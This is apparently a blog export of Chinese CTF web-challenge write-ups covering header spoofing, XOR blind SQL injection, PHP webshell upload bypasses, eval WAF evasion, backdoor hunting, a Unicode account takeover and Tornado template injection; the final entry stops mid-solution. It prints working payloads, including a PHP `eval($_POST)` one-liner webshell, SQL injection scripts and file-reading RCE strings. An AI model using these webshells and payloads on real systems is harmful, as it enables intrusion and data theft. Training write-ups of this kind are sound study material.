    <url>/2020/01/26/hgame-Code-World/</url>
    <content><![CDATA[<h1 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h1><p>打开竟然是个403</p>
<p>用bp抓包<br>访问一下index.php<br><img src="/images/hgame/codeworld/0.png" alt="avatar"></p>
<p>发现405错误<br><a href="https://www.jianshu.com/p/dd7315428462" target="_blank" rel="noopener">https://www.jianshu.com/p/dd7315428462</a></p>
<p>所以更改为POST请求<br><img src="/images/hgame/codeworld/1.png" alt="avatar"></p>
<p>提示要求通过URL计算两个数相加为10</p>
<p>所以直接URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/?a=1+9</span><br></pre></td></tr></table></figure>
<p>但是由于URL中+会被转译为空格 使用URL编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/?a=1%2b9</span><br></pre></td></tr></table></figure>
<p>![avatar](/images/hgame/code world/2.png)</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-接 头 霸 王</title>
    <url>/2020/01/26/hgame-Cosmos-%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h1><p>打开环境 根据题目的图片提示 应该是改header</p>
<p>bp抓包<br>再根据You need to come from <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a>. </p>
<p>使用Referer</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer:https://vidar.club/</span><br></pre></td></tr></table></figure>

<p>又要求本地，使用X-Forwarded-For</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>
<p>又要求使用Cosmos浏览器，使用User-Agent</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent: Cosmos</span><br></pre></td></tr></table></figure>

<p>又要求POST，直接改请求</p>
<p>得到：The flag will be updated after 2077, please wait for it patiently.</p>
<p>这里要用到If-Unmodified-Since<br>可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If-Unmodified-Since: Tue, 22 Oct 2077 20:49:38 GMT</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Hack World</title>
    <url>/2020/01/25/BUUCTF-Hack-World/</url>
    <content><![CDATA[<h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>打开环境 题目提示是Php 和 sql注入<br>所以先按常规的SQL来测试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">1 一句骚话</span><br><span class="line">2 一句骚话</span><br><span class="line">1&apos; bool(false)</span><br><span class="line">1&apos;# SQL Injection Checked.</span><br></pre></td></tr></table></figure>
<p>尝试一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">联合注入：unin被过滤</span><br><span class="line">报错注入：and、or、updatexml被过滤</span><br><span class="line">bool注入和time注入：and、or被过滤</span><br><span class="line">可以通过fuzz测试（模糊测试），发现哪些字符被过滤了。length为482的，全都是被过滤的。</span><br></pre></td></tr></table></figure>
<p>这里没啥 思路了 但是通过bool(false)  可以判断应该是布尔盲注把 </p>
<p>看看WP<br>这里考的是异或注入：<br>1^1=0</p>
<p>1^0=1</p>
<p>另外还学到了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用/*!union*/可以绕过对union的过滤  但是这题不能用 先存着</span><br></pre></td></tr></table></figure>

<p>由于不会写脚本 所以找了个大师傅的二分脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://a5b5ef4b-d1ce-48aa-a3cf-31243ef82374.node3.buuoj.cn/index.php&quot;</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;id&quot; : &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    l = 33</span><br><span class="line">    r =130</span><br><span class="line">    mid = (l+r)&gt;&gt;1</span><br><span class="line">    while(l&lt;r):</span><br><span class="line">        payload[&quot;id&quot;] = &quot;0^&quot; + &quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,mid)</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        print(payload)</span><br><span class="line">        if &quot;Hello&quot; in html.text:</span><br><span class="line">            l = mid+1</span><br><span class="line">        else:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;1</span><br><span class="line">    if(chr(mid)==&quot; &quot;):</span><br><span class="line">        break</span><br><span class="line">    result = result + chr(mid)</span><br><span class="line">    print(result)</span><br><span class="line">print(&quot;flag: &quot; ,result)</span><br></pre></td></tr></table></figure>


<p>得到flag</p>
<p>不会写脚本 好多题都没法做 唉</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-CheckIn</title>
    <url>/2020/01/25/BUUCTF-CheckIn/</url>
    <content><![CDATA[<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>打开环境看到是一个上传的界面 难道是一句话木马</p>
<p>上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名</p>
<p>所以尝试在.php后加一个空格 再.png 成功上传</p>
<p>通过抓包 还发现过滤掉了&lt;?, 所以我们变形为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;@eval($_POST[&apos;a&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这里没有什么思路了 去看了一下WP  有两个知识点</p>
<ol>
<li><p>.user.ini文件 <a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
</li>
<li><p>GIF89a 图片头文件欺骗 <a href="https://blog.csdn.net/piaolankeke/article/details/5872876" target="_blank" rel="noopener">https://blog.csdn.net/piaolankeke/article/details/5872876</a></p>
</li>
</ol>
<p>接下来就是上传了<br><img src="/images/BUUCTF/CheckIn/0.png" alt="avatar"></p>
<p><img src="/images/BUUCTF/CheckIn/1.png" alt="avatar"></p>
<p>接下来用菜刀getshell</p>
<p>得到flag</p>
<p>这里还有一种GET型的一句话木马<br>步骤与之前差不多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;@eval($_GET[&apos;a&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>URL：<br>?a=system(“cat /flag”);</p>
<p>也可以得到flag</p>
<p>题目提供了源码：<br><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-lottery</title>
    <url>/2020/01/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-lottery/</url>
    <content><![CDATA[<h1 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h1><p>打开环境 看了一下题目 大概一下就是玩个游戏 只要你输入的7个数字和系统随机生成的7个数字一样 你就会获得钱  钱够了可以买flag</p>
<p>首先 访问 /robots.txt 或者 /.git/ 发现 Git 仓库可以 GitHack 拿到源码<br>漏洞在 api.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  $money = $_SESSION[&apos;money&apos;];</span><br><span class="line">$numbers = $req[&apos;numbers&apos;];</span><br><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">$same_count = 0;</span><br><span class="line">for($i=0; $i&lt;7; $i++)&#123;</span><br><span class="line">    if($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">        $same_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没什么思路 注册一个账号 随便输入7个数字 抓包<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/lottery/0.png" alt="avatar"></p>
<p>使用 PHP 弱类型松散比较，以”1”为例，和TRUE,1,”1”相等<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/lottery/1.png" alt="avatar"></p>
<p>多发几次包  钱够了 买flag</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Easy Calc</title>
    <url>/2020/01/21/BUUCTF-Easy-Calc/</url>
    <content><![CDATA[<h1 id="Easy-Calc"><a href="#Easy-Calc" class="headerlink" title="Easy Calc"></a>Easy Calc</h1><p>打开环境是个计算器，搜索一下Calc是什么</p>
<p>最后发现是CSS中的一个样式，用于进行一下计算<br><a href="http://caibaojian.com/css3-calc.html" target="_blank" rel="noopener">http://caibaojian.com/css3-calc.html</a></p>
<p>尝试一下注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">1 正常</span><br><span class="line">1’ 没有报错</span><br><span class="line">1&apos;# 直接给PASS了</span><br></pre></td></tr></table></figure>
<p>到这里考虑不是SQL注入题</p>
<p>crtl+u看一下源码 看到作者给了提示 写了WAF保障安全</p>
<p>WAF：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(&apos;#calc&apos;).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">            type:&apos;GET&apos;,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return false;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>$(“#content”).val()是什么意思？  百度一下得知类似于HTML中的document.getElementById(“content”); </p>
<p>再百度一下encodeURIComponent 得知是将参数进行URI编码</p>
<p>再查看一下calc.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&apos;num&apos;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&apos;num&apos;];</span><br><span class="line">        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&apos;echo &apos;.$str.&apos;;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>根据WAF来进行绕过</p>
<p>接下来构造payload：<br>使用scandir（）返回根目录看一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num=1;var_dump(scandir(/));</span><br></pre></td></tr></table></figure>
<p>发现不行 这里没有思路了 看一下WP知道了</p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
<p>所以在num变量前加个空格来让WAF识别不到  并且用char()进行转义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>

<p><img src="/images/BUUCTF/Easy_Calc/0.png" alt="avatar"></p>
<p>找到flagg目录</p>
<p>那就继续读取 使用file_get_contents</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-ics-06</title>
    <url>/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-06/</url>
    <content><![CDATA[<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>进去之后感觉没有什么可以做的地方<br>用御剑扫描一下<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/0.png" alt="avatar"></p>
<p>找到一个index.html  访问一下<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/1.png" alt="avatar"></p>
<p>送分题？</p>
<p>看了一下URL 有id=1</p>
<p>打开bp 爆破一下 因为是数字 所以用python写一个字典出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range (<span class="number">10001</span>):</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>
<p>直接爆破<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/2.png" alt="avatar"></p>
<p>id=2333 改一下 然后发包<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/3.png" alt="avatar"></p>
<p>得到flag</p>
<p>真·送分题</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-高明的黑客</title>
    <url>/2020/01/20/BUUCTF-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>打开之后得到一个提示源代码存在了<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></p>
<p>当时比赛的时候遇到这个题，还一直脑残的以为是某个网站，哭了<br>直接URL访问之后，会下载到源码<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz</a></p>
<p>下载好了之后推测是个压缩包之类的，搜一下gz后缀，果然是常见于Linux和MacOS下的压缩包格式，直接7-zip解压</p>
<p>发现有个src的文件，里面有很多杂乱的PHP文件，随便打开一个试试<br>发现读不太懂，但是像$_GET eval echo等还是有的</p>
<p>这里就没有什么思路了，所以看了一下官方WP，找了一个爆破脚本遍历GET并传一些参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:\phpStudy\phpStudy\PHPTutorial\WWW\src"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(file)</span>:</span></span><br><span class="line">    print(<span class="string">'finding...'</span>)</span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  <span class="comment"># 打开文件</span></span><br><span class="line">    iter_f = iter(f);  <span class="comment"># 创建迭代器</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># 遍历文件，一行行遍历，读取文本</span></span><br><span class="line">        str = str + line</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个页面内所有参数</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        params[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_POST['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("====================")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">            <span class="comment"># read_file(file)</span></span><br><span class="line"></span><br><span class="line">            pool.submit(read_file, file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_param</span><span class="params">(fileName)</span>:</span></span><br><span class="line">    url = <span class="string">"http://localhost/src/"</span></span><br><span class="line">    f = open(path+<span class="string">'/'</span>+fileName, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    content = f.read()</span><br><span class="line">    m = re.findall(<span class="string">"\$_(GET|POST)\['(.+?)'\]"</span>, content)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="keyword">for</span> seq <span class="keyword">in</span> m:</span><br><span class="line">            print(<span class="string">'finding...'</span>)</span><br><span class="line">            method = seq[<span class="number">0</span>]</span><br><span class="line">            param = seq[<span class="number">1</span>]</span><br><span class="line">            payload = <span class="string">''</span></span><br><span class="line">            payload += <span class="string">'?'</span></span><br><span class="line">            payload += param</span><br><span class="line">            payload += <span class="string">"="</span></span><br><span class="line">            payload += <span class="string">"echo glzjin"</span></span><br><span class="line">            res = requests.get(url + fileName + payload)</span><br><span class="line">            n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                print(<span class="string">'found!'</span>)</span><br><span class="line">                print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">'POST'</span>:</span><br><span class="line">                postData = &#123; param: <span class="string">"echo glzjin'"</span> &#125;</span><br><span class="line">                res = requests.post(url + fileName, data=postData)</span><br><span class="line">                n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">                <span class="keyword">if</span> n:</span><br><span class="line">                    print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#find_file()</span></span><br><span class="line">    find_param(<span class="string">'xk0SzyKwfzw.php'</span>)</span><br></pre></td></tr></table></figure>

<p>在运行脚本之前需要启动PHP环境 并根据自己的路径进行相应的修改<br><img src="/images/BUUCTF/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/0.png" alt="avatar"></p>
<p>成功找到</p>
<p>去这个文件去看看<br><img src="/images/BUUCTF/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/1.png" alt="avatar"><br>这个部分很关键</p>
<p>接下来就构造payload:<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a></p>
<p>得到flag</p>
<p>感觉不是太懂官方这个WP 为什么说那一段代码很关键 我表示一脸懵逼看不出来<br>后面又找了一篇WP，看了一下，大概就是该后门的密码之类的<br>可以参考一下：<br><a href="https://www.cnblogs.com/chrysanthemum/p/11717337.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11717337.html</a></p>
<p>另外官方的脚本感觉就像已经知道了是哪个文件 特定也出来的 速度非常快 可能这就是出题人自己写WP的弊病吧 建议采用一下上面这篇文章里的脚本 虽然很慢 但是有那种爆破的感觉了 而不是直接输出是哪个文件</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-admin</title>
    <url>/2020/01/18/BUUCTF-admin/</url>
    <content><![CDATA[<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>打开环境，再根据题目，可以猜测大概是伪造admin登录就OK了<br>没有什么思路 先随便注册一个吧<br>登录之后，点change password  查看一下源码<br>得到hint<br><img src="/images/BUUCTF/admin/0.png" alt="avatar"></p>
<p>又又又又是flask  我要吐了</p>
<p>复制连接 下载一下</p>
<p>随后打开index.php 查看代码</p>
<p>flask之前比赛时遇到过，CNSS也遇到过，一个轻量级的python框架，这题有两种解法，一种是session  写脚本就可以直接得到 但是奈何不会写</p>
<p>所以只好使用strlower  转小写函数去尝试注册ADMIN<br>哦豁，发现GG了，那再看看strlower的定义中有nodeprep.prepare()这个函数<br>我们先使用unicode编码的字符 ᴬ<br>用这个用户名注册</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ᴬdmin</span><br></pre></td></tr></table></figure>
<p>这个时候nodeprep.prepare()函数会将用户名变为Admin，随便修改一下密码，就会再次调用该函数变为admin</p>
<p>这个时候其实已经覆写了admin的密码 直接登录</p>
<p>得到flag</p>
<p>这里是利用了unicode的编码问题<br>可以参考一下：<br><a href="https://unicode-table.com/en/blocks/phonetic-extensions/" target="_blank" rel="noopener">https://unicode-table.com/en/blocks/phonetic-extensions/</a></p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-EasySQL 1</title>
    <url>/2020/01/18/BUUCTF-EasySQL-1/</url>
    <content><![CDATA[<h1 id="EasySQL-1"><a href="#EasySQL-1" class="headerlink" title="EasySQL 1"></a>EasySQL 1</h1><p>题目得到是SQL注入，那就直接上手，先按常规的来：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">1 返回数据</span><br><span class="line">1&apos; 没有返回数据  看来不需要&apos;</span><br><span class="line">1;  正常返回</span><br><span class="line">1; show databases;  和前面学到的堆叠一样的原理</span><br><span class="line">1; show tables;  Array ( [0] =&gt; Flag )</span><br></pre></td></tr></table></figure>
<p>接下来就没有头绪了，看了一下WP，感觉大佬说的听不太懂</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select $_GET[&apos;query&apos;] || flag from flag</span><br></pre></td></tr></table></figure>
<p>这是内嵌的select</p>
<p>输入的参数都传给了query，所以只要query为1，即为真，就返回flag</p>
<p>但是我真的很想知道这个内嵌是怎么看出来的，唉，还是太菜了</p>
<p>最后输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>最后这个输入进去，按照刚才的拼接，后台的代码呈现的应该是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select *,1 || flag from flag</span><br></pre></td></tr></table></figure>
<p>大佬们还是太强了</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-easy_tornado 1</title>
    <url>/2020/01/18/BUUCTF-easy-tornado-1/</url>
    <content><![CDATA[<h1 id="easy-tornado-1"><a href="#easy-tornado-1" class="headerlink" title="easy_tornado 1"></a>easy_tornado 1</h1><p>打开环境就看到三个链接，依次打开得到：<br>flag in /fllllllllllllag</p>
<p>render</p>
<p>md5(cookie_secret+md5(filename))</p>
<p>目前看来只有第一个和第三个有用<br>flag在/fllllllllllllag目录下<br>用到了md5</p>
<p>我觉得cookie_secret有点东西，百度了一下果然发现了题目<br><a href="https://www.cnblogs.com/liyqiang/p/7140530.html" target="_blank" rel="noopener">https://www.cnblogs.com/liyqiang/p/7140530.html</a></p>
<p>emmmm 貌似tornado是python的一个框架，python还木有学，太尴尬了<br>只好查资料，最后得到：<br>render好像是个渲染函数之类的</p>
<p>先随便看看：<br>尝试一下文件包含</p>
<p><img src="/images/BUUCTF/tornado/0.png" alt="avatar"></p>
<p>返回了错误界面，没有思路了，只好看看大佬的WP，存在模板注入；<br>Tornado可以参考这里：<br><a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a></p>
<p>error改成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?msg=&#123;&#123;handler.settings&#125;&#125;  handler.settings获取环境变量</span><br></pre></td></tr></table></figure>

<p><img src="/images/BUUCTF/tornado/1.png" alt="avatar"></p>
<p>成功得到了cookie_secret<br>接下来就只需解决md5的问题了</p>
